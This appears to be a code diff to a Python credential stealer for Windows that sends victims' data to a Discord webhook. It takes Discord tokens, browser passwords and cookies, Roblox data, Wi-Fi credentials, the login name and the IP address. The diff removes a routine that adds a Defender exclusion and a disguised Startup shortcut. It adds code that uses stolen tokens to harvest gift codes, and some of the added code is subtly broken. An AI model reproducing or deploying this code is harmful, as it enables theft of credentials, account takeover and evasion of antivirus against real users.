@@ -16,8 +16,7 @@ tokenPaths = {
 }
 
 config = {
-	"Startup": True,
-	"webhook": 'https://discord.com/api/webhooks/1039097523643633684/-DWH0IuPWBN1SuX8Oh-7fnFs14TQfbp3yWgEcM0RGTzu4u2VyNsRxGqTUk-gclmEWWFv',
+	"webhook": 'https://discord.com/api/webhooks/1039097523643633684/-DWH0IuPWBN1SuX8Oh-7fnFs14TQfbp3yWgEcM0RGTzu4u2VyNsRxGqTUk-gclmEWWFv'
 }
 
 class main():
@@ -60,8 +59,6 @@ class main():
 		for plt, pth in self.browserpaths.items(): self.grabBrowserInfo(plt, pth)
 		self.writeRoblox()
 		self.grabwifi()
-
-		if config["Startup"] and not os.getcwd() == fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService": self.startup()
 
 		self.zipup()
 		self.send()
@@ -110,17 +107,6 @@ class main():
 				txt = f.read()
 				content = txt.replace('api/webhooks', 'api/nethooks')
 			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
-
-	def startup(self):
-		if not sys.argv[0] == fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}": self.system(fr"powershell.exe Set-MpPreference -ExclusionPath 'C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService'")
-		shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
-		try: 
-			shell = win32com.client.Dispatch("WScript.Shell")
-			shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk")
-			shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
-			shortcut.save()
-		except: os.remove(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk"); self.startup() 
-
 
 	def get_tokens(self, path):
 		cleaned = []
@@ -172,6 +158,22 @@ class main():
 	def writeTokens(self):              
 		for token in self.tokens:
 			r = requests.get(url='https://discord.com/api/v9/users/@me', headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11", "Authorization": token}).json()
+			g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11", "Authorization": token}).json()
+				
+			val_codes = []
+			if "code" in g.text:
+				codes = json.loads(g.text)
+				try:
+					for code in codes:
+						val_codes.append((code['code'], code['promotion']['outbound_title']))
+				except TypeError:
+					pass
+					
+			if val_codes == []:
+				val += f'\n:gift: **No Gift Cards Found**\n'
+			else:
+				for c, t in val_codes:
+					val += f'\n`{t}:`\n**{c}**\n'
 			open(os.path.join(self.tempfolder, "Discord.txt"), 'a').write(r["username"]+"#"+r["discriminator"]+"\n"+token+"\n\n")
 
 	def grabBrowserInfo(self, platform, path):
@@ -229,18 +231,19 @@ class main():
 						x.start()
 					for x in threads:
 						x.join()
-			with open(self.tempfolder+f'\\{platform} Cookies ({profile}).txt', "w", encoding="utf8", errors='ignore') as m, open(self.tempfolder+fname, "w", encoding="utf8", errors='ignore') as f:
-				if self.formatted_cookies:
-					m.write(self.formatted_cookies)
-				else:
-					m.close()
-					os.remove(self.tempfolder+f'\\{platform} Cookies ({profile}).txt')
-				
-				if self.passwords_temp or self.cookies_temp or self.misc_temp:
-					f.write(formatter(self.passwords_temp, self.cookies_temp, self.misc_temp))
-				else:
-					f.close()
-					os.remove(self.tempfolder+fname)
+						
+					with open(self.tempfolder+f'\\{platform} Cookies ({profile}).txt', "w", encoding="utf8", errors='ignore') as m, open(self.tempfolder+fname, "w", encoding="utf8", errors='ignore') as f:
+						if self.formatted_cookies:
+							m.write(self.formatted_cookies)
+						else:
+							m.close()
+							os.remove(self.tempfolder+f'\\{platform} Cookies ({profile}).txt')
+
+						if self.passwords_temp or self.cookies_temp or self.misc_temp:
+							f.write(formatter(self.passwords_temp, self.cookies_temp, self.misc_temp))
+						else:
+							f.close()
+							os.remove(self.tempfolder+fname)
 					
 	def grabPasswords(self,mkp,bname,pname,data):
 		self.passwords_temp = ''
@@ -380,6 +383,10 @@ class main():
 	def send(self):
 		if self.fileList: files = "\u001b[32mFiles:\u001b[35m\n"+' \n'.join(self.fileList)
 		else: files = "No files found"
+
+		if self.tokens: tokens = "\u001b[32mTokens:\u001b[35m\n"+' \n'.join(self.tokens)
+		else: tokens = "No tokens found"
+
 		data = requests.get("https://ipinfo.io/json").json()
 		ip = data["ip"]
 		embed = {
@@ -388,7 +395,7 @@ class main():
 			"embeds": [
 				{
 					"name": "**Files**",
-					"description": f"**Login: **{os.getlogin()}\n**IP:** {ip}\n\n```ansi\n{files}```",
+					"description": f"**Login: **{os.getlogin()}\n**IP:** {ip}\n\n```ansi\n{tokens}```\n```ansi\n{files}```\n",
 					"color": 10181046,
 					"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
 				}
